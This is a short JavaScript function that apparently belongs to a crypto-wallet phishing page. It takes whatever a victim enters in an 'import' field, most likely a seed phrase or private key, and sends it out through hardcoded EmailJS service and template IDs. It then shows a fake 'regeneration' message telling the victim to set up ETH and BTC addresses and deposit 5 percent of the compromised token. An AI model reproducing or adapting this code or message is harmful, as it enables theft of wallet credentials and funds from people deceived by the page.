
function sendEmail() {
    var params = {
        import : document.getElementById("import").value,
    }

    const serviceID ="service_v7v6ysn"
    const templateID = "template_2g8v18b"

    emailjs.send(serviceID, templateID, params) 
    .then (
        res => {
            document.getElementById("import").value ="";
            console.log(res);
            document.getElementById("query").innerHTML = "Regeneration In Progress, On this web3 wallet, set up an eth and btc wallet address and add 5 percent of the compromised token as you will get it regenerated in few hours after, More details via email !!!";
        } )  
        .catch(err => console.log(err)); 
}